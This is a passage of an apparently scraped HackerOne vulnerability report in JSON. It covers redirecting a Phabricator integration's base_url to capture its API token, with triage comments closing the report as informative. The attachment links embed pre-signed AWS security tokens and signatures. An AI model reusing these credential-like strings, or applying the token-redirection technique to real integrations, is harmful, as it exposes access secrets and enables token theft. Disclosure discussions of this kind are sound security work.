RiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c5e4bbe1afd190dbd8a30432ed0ad1069bf490ce8ee27ab129306a9c0bb05bb4",
+            "file_size": 76566,
+            "type": "image/png"
+        },
+        {
+            "id": 1262348,
+            "file_name": "initial-escalate.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/v9chdn3s4njz677vko9imah0vf5j?response-content-disposition=attachment%3B%20filename%3D%22initial-escalate.png%22%3B%20filename%2A%3DUTF-8%27%27initial-escalate.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=df7d390fba4c7b4a9235b304c4c128d5be43588953d138491b3cbcbc1b9e17e3",
+            "file_size": 121429,
+            "type": "image/png"
+        },
+        {
+            "id": 1262349,
+            "file_name": "updated2.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ikwv892hlai8k6xqn733rl3a4pab?response-content-disposition=attachment%3B%20filename%3D%22updated2.png%22%3B%20filename%2A%3DUTF-8%27%27updated2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0ef32bf865e928dc8cb0921309e351a79fc67a2039c46e318385e06b19746859",
+            "file_size": 159076,
+            "type": "image/png"
+        },
+        {
+            "id": 1262350,
+            "file_name": "second-escalate.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xzstm9jrhbm607koq1zmgg4os97e?response-content-disposition=attachment%3B%20filename%3D%22second-escalate.png%22%3B%20filename%2A%3DUTF-8%27%27second-escalate.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9c5d860f7e776d3acfab99724c4197fda77244b2e8720d3d8ea8dd7b28d3fc8d",
+            "file_size": 131268,
+            "type": "image/png"
+        },
+        {
+            "id": 1262353,
+            "file_name": "jira-escalate.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fxq9p3rxwtebpokb8s3cuz765bmb?response-content-disposition=attachment%3B%20filename%3D%22jira-escalate.png%22%3B%20filename%2A%3DUTF-8%27%27jira-escalate.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e76622d77ab284a5e1531a9573979b48b846b73614e34afa78c0574157b1d856",
+            "file_size": 100039,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 13,
+    "voters": [
+        "taha",
+        "mr-medi",
+        "run_win",
+        "sudi",
+        "h4x0r_dz",
+        "akashhamal0x01",
+        "sa1tama0",
+        "raymatp",
+        "cryptographer",
+        "beerboy_ankit",
+        "and 3 more..."
+    ],
+    "severity": {
+        "rating": "critical",
+        "score": 9.1,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "high",
+            "user_interaction": "none",
+            "scope": "changed",
+            "confidentiality": "high",
+            "integrity": "high",
+            "availability": "none"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 3,
+        "asset_type": "URL",
+        "asset_identifier": "hackerone.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 11357243,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "We also noticed that during our tests since there is no control for existing escalation to **Phabricator** unlike jira, we can assign multiple issues for it and even when they are removed via `RemoveReference` mutation, system is not removing bi-directional notification for removed reference. It just retrieves previous reference to the report (see F1262378) which we believe that reason for sending notifications for the removed references keep happening.\n\nEven though it changes to previous one due to previous one being active removed reference is still getting updates for the report.",
+            "automated_response": false,
+            "created_at": "2021-04-12T06:12:23.717Z",
+            "updated_at": "2021-04-12T06:17:12.521Z",
+            "actor": {
+                "username": "nukedx",
+                "cleared": true,
+                "verified": true,
+                "url": "/nukedx",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1262378,
+                    "filename": "remove-ref.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7caj53i5hnodiy4ftoxuvice6ohl?response-content-disposition=attachment%3B%20filename%3D%22remove-ref.png%22%3B%20filename%2A%3DUTF-8%27%27remove-ref.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTA7HH55G%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDqXVnlWTzlv%2Fd7HCd0yCrYHysNGuQtiSDZL7SMrudxuAIhAJLcjM9aCxGQgmCW7rXwZukV0Lu9IvkbsDprAGcqGXMLKroFCJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxTDbDFOTYvNFHNlWUqjgXUo9ScPJ6%2BOW02ubN2LCAqP9OQBfeYKn%2BTMnaFHWelbJNM3Ybi7xbSwP4BZQMuexFblUT7UGsxQr%2BGWODAE9xJCnXJuhlgezU2hdF%2BPPPY389NdZbAVxb5MVSNrY7nWoaOJuh%2Bmj%2BvZZ4GLjs6MQwY1WV5xE%2BrQZu7pIO%2B4KpAvhHw5ANwXosxWrrf6lagntLpnPdw6efCEmOhGs8o3SpMzFcLaod8Qcb8dP9izvVZ%2Bk2mRL9Y2X8aKwJ2U6rMA9Ye2HK2ukAGkoYN%2FNMRTU7vpNKIWmjkTJf9DEGH5%2F9%2Fv5MJZDDLofADzAotdiIc1lDAo%2BoxiX4Uxa76wPzHEqO%2FQ9H71dnpQnTu4YGw66jRrVC%2FekFk6A%2BLHB6zVoLKl9w69KiE%2BBcjybguiSleQzVv8ex2HSaWq6xehiBm4fKsMMM%2Fntp%2BUQWo%2FoLo2jil2sforh%2FO5BUKqLZFL0Ln15gt5wz%2BJSB1dTFn38xZR%2BfBaq07E7m01Ssjm18cc8QIqJNUbvBBuhAIsRtR%2BfdL6PVKHYRiA%2Fb7O1Ay9JLo%2B81Wj4FGbgPzVzSrE8s2vZolh%2FCBQbwO44O%2BMqHsk9mRYaXs7aelgqrXiPlOKBoAa%2Fy1ip3586lulBTyUB%2F%2Fyaxs0Rk7W7s956INomM8O0wpnY1VKM9m98JfqCR8exr49G7KlySPriVYMK9rTESog0RzuTdB4Dg577JF0IgRpSt4TbSELg6kgcm5ZLlzZxp4iwHpMr9GWLvp5VFEfWpD576whlCPg1Csp%2Fy%2BAUBMEGEARqYljzetL9PDVRsMcWXV4OjGg38h72y880ohoIKRaarxyzLB23HaY20j2HJAJw1ykOofHGGwQW99Do2OfBTcoTUwv5S2pwY6sAGJQRSNXxmwL9EzhVue07Ho3vocGleYvMK3hizWJ24mvKAsRbirJqsEEGrEYH0ACUVb3dtNd8wWgDvsdM3WtRUvhmvbWcG8ubDK0RitK%2FkCGlpyFJSULvhAEr46MC2sVjoSrepZKDZJXHfSgIW6w3LbvmZu7riIA9iMSxxCyE0CE1NwhuZ%2FGvGkqq%2BMzMbgKEiSBYFLVKqq%2F9SoYGcnNKI8FREj92gh0uaI%2Bniwnnqr2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=651dbc5c3521bd18696650080304bc0013be140b32e245dfb28894de2b1581c6"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11366993,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @nukedx,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@tuxedo",
+            "automated_response": false,
+            "created_at": "2021-04-12T18:22:17.457Z",
+            "updated_at": "2021-04-12T18:22:17.457Z",
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11372377,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @nukedx - I'm discussing this submission internally with the HackerOne team. You will be updated as soon as there is additional information to share. Thanks for your patience!",
+            "automated_response": false,
+            "created_at": "2021-04-13T05:13:48.823Z",
+            "updated_at": "2021-04-13T05:13:48.823Z",
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11388092,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @nukedx,\n\nThanks for the great write-up! I loved reading it and thought the technique you used to extract the API token is a smart one! \n\nHowever, to pull off this attack, you'll need a malicious team member with program management permissions. I've double-checked the permissions on mutation and confirmed we only allow Phabricator integration changes if you have management permissions on the team.\n\nHaving a rogue team member/manager is the problem. There's little our platform can do to defend against such a scenario. Therefore, I believe this report is not describing a valid security vulnerability.\n\nWhat do you think of my assessment? \n\nThanks!",
+            "automated_response": false,
+            "created_at": "2021-04-14T05:26:47.343Z",
+            "updated_at": "2021-04-14T05:27:26.371Z",
+            "actor": {
+                "username": "wvdv",
+                "cleared": false,
+                "verified": false,
+                "url": "/wvdv",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/221/7503cfe93236733876c422fb69d8a9a81824802c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11388138,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @wvdv,\n\nFirstly, thanks for kind words :). I'm pleased to hear that you loved reading it.\n\nWell I agree with you that having malicious team member it's programs fault but this is still valid security vulnerability because, team members shouldn't be allowed to update `base_url` when there is valid connection. When we disconnect entry on database is removed and when we add new connection it's generating new id for connection.\n\nThat's one of the reasons I set privileges high on CVSS, I know this shouldn't be treated as crit original score was 8.7, but looks like there is an additional score for this asset.\n \nSadly, unlike previous times, when we were allowed to add many team members to sandbox programs I could check other permissions for RBAC sadly now I can not but I believe attacker should be having `Edit profile, program and bounty settings` permissions under `Program` group.\n\nAs mentioned being ability to update `base_url` is troublesome which leads to API token leak as demonstrated, yet we can see that ability to update `base_url` is not in UI itself, neither `api_token` is retrieved via GraphQL queries.\n\nOn programmers perspective, I highly believe controlling existing connection and preventing `base_url` update in case of this, would easily solve this issue and which should be done in first place :)\n\nStill from my assessment this is a security vulnerability because of the given facts.\n\nI would be love to hear what you think for it as well :)\n\nNonetheless, please stay safe and be well.\n\nSincerely,\n@nukedx",
+            "automated_response": false,
+            "created_at": "2021-04-14T05:36:28.577Z",
+            "updated_at": "2021-04-14T05:39:20.295Z",
+            "actor": {
+                "username": "nukedx",
+                "cleared": true,
+                "verified": true,
+                "url": "/nukedx",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11389265,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "hey @nudedx,\n\nGotcha! So you're suggesting that the `base_url` and the tokens should be tightly coupled. In this case, if you change the `base_url`, the token should also be updated. I have to think a little bit on the implications of this constraint, for UX purposes we keep the API token as integrations do change their domain and we don't want to make this process too painful where a new token has to be requested (for some customers this takes a lot of effort as such request). \n\nIn this case, we chose a frictionless UX over a constraint that **could** have a security benefit **if** you have a rogue team member. Therefore, I'm closing this report as informative as we're not going to introduce this constraint and make no changes to how we update the Phabricator integration settings.\n\n> Sadly, unlike previous times, when we were allowed to add many team members to sandbox programs I could check other permissions for RBAC sadly now I can not but I believe attacker should be having Edit profile, program and bounty settings permissions under Program group.\n\nNot sure if you are referring to a sandbox constraint? You should be able to use all features that our platform offers in a sandboxed team. Maybe you have to change product editions first?\n\nThanks again for this cool report and feel free to keep the discussion going!\n\nWillian\n\n\n",
+            "automated_response": false,
+            "created_at": "2021-04-14T08:28:00.467Z",
+            "updated_at": "2021-04-14T08:28:00.467Z",
+            "actor": {
+                "username": "wvdv",
+                "cleared": false,
+                "verified": false,
+                "url": "/wvdv",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/221/7503cfe93236733876c422fb69d8a9a81824802c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11390961,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi Willian,\n\nThanks for reply and your willingness to keep discussion going. I believe you are confusing some stuff, problem is lying on for both integration creating process and updating process same GraphQL mutation is used `UpdatePhabricatorIntegration`, code on backend probably looks like this (I'm not really good at ruby but I'll try to simulate\n\n```ruby\nrequire \"phabricator_integration\"\nrequire \"session\"\n\nteam_id = session.user.team_id\n\nif PhabricatorIntegration.is_having_active_connection(team_id) do\n     return PhabricatorIntegration.show_ui_for_updating_parameters\nelse\n     return PhabricatorIntegration.show_ui_for_creating_connection\nend\n ```\n\nSo above is sample ruby code checking if current user's team is having active Phabricator connection and showing UI, if not it's showing UI for creating new connection.\n\nHowever on UI for updating integration there is no option for updating `base_url` neither for `api_token`, meanwhile only way to change URL is disconnecting it and creating new one.\n\nI recorded video for how it's processing on normal user which you can find below and I highly believe when you check it you will understand my point of view:\n\n████████\n\nAs we can see on video, integration's ID is not changing when URL updated and there is no UI option for it :).\n\nIf you are going to add an option for updating `base_url` on UI or if there was an option for it, I could understand your point of view.\n\nSo my suggestion would be, either add `base_url` changing option on UI as well as maybe add option for changing `api_token` and if no token is in present just update URL like as it now or separate creating and updating process from each other by using their own functions and do not update URL on update.\n\nI hope this makes it more clear.\n\nPlease be aware that while it's programs own responsibility if they are having malicious actor, it's still also HackerOne's responsibility to minimize such threat actors because most of attacks actually coming from insider threats, maybe your point of view for threat model is different from me.\n\nPS: What I mean for RBAC, on previously we could add extra users to sandbox program with different access rights as of now we can only have our own account can not add new users, I believe we can still change our permissions but and we can not change our user to none admin because team must have only one admin, yet demo-member is not treated as actual admin when we are trying to change our group.\n\nSincerely,\n@nukedx\n\n",
+            "automated_response": false,
+            "created_at": "2021-04-14T10:39:28.991Z",
+            "updated_at": "2021-04-30T16:58:32.356Z",
+            "actor": {
+                "username": "nukedx",
+                "cleared": true,
+                "verified": true,
+                "url": "/nukedx",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/CejJr9DapQ8cLv4WyHaDx6LB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 11391101,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for the additional info @nukedx! Let me think about it some more, I will come back to you!",
+            "automated_response": false,
